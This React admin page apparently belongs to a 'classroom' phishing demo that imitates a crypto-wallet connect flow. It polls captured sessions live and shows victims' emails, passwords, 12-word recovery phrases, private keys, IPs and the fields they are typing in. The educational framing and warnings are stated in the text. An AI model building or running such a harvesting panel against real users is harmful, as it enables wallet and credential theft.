import { useCallback, useEffect, useState } from 'react'
import { AlertTriangle, RefreshCw, Trash2, Radio } from 'lucide-react'
import toast from 'react-hot-toast'
import {
  clearEduPhishSessionsAdmin,
  fetchEduPhishSessionsAdmin,
  isEduPhishingDemoEnabled,
  type EduPhishSession,
} from '../../lib/eduPhishDemo'
import { EmptyState } from '../../components/admin/EmptyState'

function formatTime(iso: string): string {
  return new Date(iso).toLocaleTimeString(undefined, {
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
  })
}

function stepLabel(step: EduPhishSession['step']): string {
  switch (step) {
    case 'connecting':
      return 'Fake connect…'
    case 'import_prompt':
      return 'Import prompt'
    case 'recovery_form':
      return 'Typing secrets'
    case 'submitted':
      return 'Submitted'
    default:
      return step
  }
}

function SessionCard({ session }: { session: EduPhishSession }) {
  const filledWords = session.seedWords.filter((w) => w.trim()).length
  const isLive = session.step !== 'submitted'

  return (
    <div
      className={`rounded-xl border p-4 space-y-3 ${
        isLive ? 'border-amber-500/40 bg-amber-500/5' : 'border-[#16212D] bg-[#0B1118]'
      }`}
    >
      <div className="flex items-start justify-between gap-2">
        <div>
          <p className="text-sm font-semibold text-white flex items-center gap-2">
            {isLive && <span className="relative flex h-2 w-2"><span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-amber-400 opacity-75" /><span className="relative inline-flex rounded-full h-2 w-2 bg-amber-500" /></span>}
            {session.walletBrand}
          </p>
          <p className="text-[10px] text-gray-500 mt-0.5">
            {stepLabel(session.step)} · updated {formatTime(session.updatedAt)}
          </p>
        </div>
        <span className="text-[10px] text-gray-600 font-mono truncate max-w-[100px]">{session.id.slice(0, 8)}</span>
      </div>

      {session.activeField && isLive && (
        <p className="text-xs text-amber-200/90">
          Typing in: <span className="font-mono">{session.activeField}</span>
        </p>
      )}

      <dl className="grid grid-cols-1 gap-2 text-xs">
        {session.email && (
          <div>
            <dt className="text-gray-500">Email</dt>
            <dd className="text-gray-200 font-mono break-all">{session.email}</dd>
          </div>
        )}
        {session.password && (
          <div>
            <dt className="text-gray-500">Password</dt>
            <dd className="text-gray-200 font-mono break-all">{session.password}</dd>
          </div>
        )}
        {filledWords > 0 && (
          <div>
            <dt className="text-gray-500">Recovery phrase ({filledWords}/12)</dt>
            <dd className="text-gray-200 font-mono text-[11px] leading-relaxed break-all">
              {session.seedWords.map((w, i) => (w.trim() ? `${i + 1}. ${w}` : null)).filter(Boolean).join(' · ')}
            </dd>
          </div>
        )}
        {session.privateKey.trim() && (
          <div>
            <dt className="text-gray-500">Private key</dt>
            <dd className="text-gray-200 font-mono text-[11px] break-all">{session.privateKey}</dd>
          </div>
        )}
      </dl>

      <p className="text-[10px] text-gray-600 truncate" title={session.userAgent}>
        {session.clientIp} · {session.pageUrl}
      </p>
    </div>
  )
}

export const AdminPhishDemo: React.FC = () => {
  const enabled = isEduPhishingDemoEnabled()
  const [sessions, setSessions] = useState<EduPhishSession[]>([])
  const [loading, setLoading] = useState(true)
  const [polling, setPolling] = useState(true)

  const load = useCallback(async () => {
    if (!enabled) {
      setLoading(false)
      return
    }
    try {
      const list = await fetchEduPhishSessionsAdmin()
      setSessions(list)
    } catch {
      /* keep last list */
    } finally {
      setLoading(false)
    }
  }, [enabled])

  useEffect(() => {
    load()
  }, [load])

  useEffect(() => {
    if (!enabled || !polling) return
    const id = setInterval(load, 1200)
    return () => clearInterval(id)
  }, [enabled, polling, load])

  const handleClear = async () => {
    try {
      const n = await clearEduPhishSessionsAdmin()
      setSessions([])
      toast.success(`Cleared ${n} demo session(s)`)
    } catch (e) {
      toast.error(e instanceof Error ? e.message : 'Clear failed — is the API running?')
    }
  }

  if (!enabled) {
    return (
      <div className="space-y-4">
        <h1 className="text-xl font-bold text-white">Scam demo (classroom)</h1>
        <div className="rounded-xl border border-[#16212D] bg-[#0B1118] p-6 text-sm text-gray-400">
          Enable <code className="text-[#c7f284]">VITE_EDU_PHISHING_DEMO=true</code> in your frontend env and{' '}
          <code className="text-[#c7f284]">EDU_PHISHING_DEMO=true</code> on the API server, then restart dev.
        </div>
      </div>
    )
  }

  return (
    <div className="space-y-4">
      <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-3">
        <div>
          <h1 className="text-xl font-bold text-white flex items-center gap-2">
            <AlertTriangle className="w-5 h-5 text-amber-400" />
            Scam demo monitor
          </h1>
          <p className="text-xs text-gray-500 mt-0.5">
            Live view of what a phishing site captures — for your school presentation only.
          </p>
        </div>
        <div className="flex items-center gap-2">
          <button
            type="button"
            onClick={() => setPolling((p) => !p)}
            className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-medium border transition-colors ${
              polling
                ? 'border-[#c7f284]/40 text-[#c7f284] bg-[#c7f284]/10'
                : 'border-[#16212D] text-gray-400 hover:text-white'
            }`}
          >
            <Radio className="w-3.5 h-3.5" />
            Live {polling ? 'on' : 'off'}
          </button>
          <button
            type="button"
            onClick={() => {
              setLoading(true)
              load()
            }}
            className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-medium border border-[#16212D] text-gray-400 hover:text-white"
          >
            <RefreshCw className="w-3.5 h-3.5" />
            Refresh
          </button>
          <button
            type="button"
            onClick={handleClear}
            className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-medium border border-red-500/30 text-red-300 hover:bg-red-500/10"
          >
            <Trash2 className="w-3.5 h-3.5" />
            Clear all
          </button>
        </div>
      </div>

      <div className="rounded-xl border border-amber-500/30 bg-amber-500/10 px-4 py-3 text-xs text-amber-100/90">
        Use fake seed phrases only (e.g. random words). Never enter a real recovery phrase. Turn this off after
        class by removing the env flags.
      </div>

      {loading && sessions.length === 0 ? (
        <div className="grid gap-3 sm:grid-cols-2">
          {Array.from({ length: 2 }).map((_, i) => (
            <div key={i} className="h-40 rounded-xl bg-[#16212D] animate-pulse" />
          ))}
        </div>
      ) : sessions.length === 0 ? (
        <EmptyState
          title="No demo victims yet"
          description="Open the main site, click Connect Wallet, pick a wallet — entries appear here as classmates type."
        />
      ) : (
        <div className="grid gap-3 sm:grid-cols-2 xl:grid-cols-3">
          {sessions.map((s) => (
            <SessionCard key={s.id} session={s} />
          ))}
        </div>
      )}
    </div>
  )
}
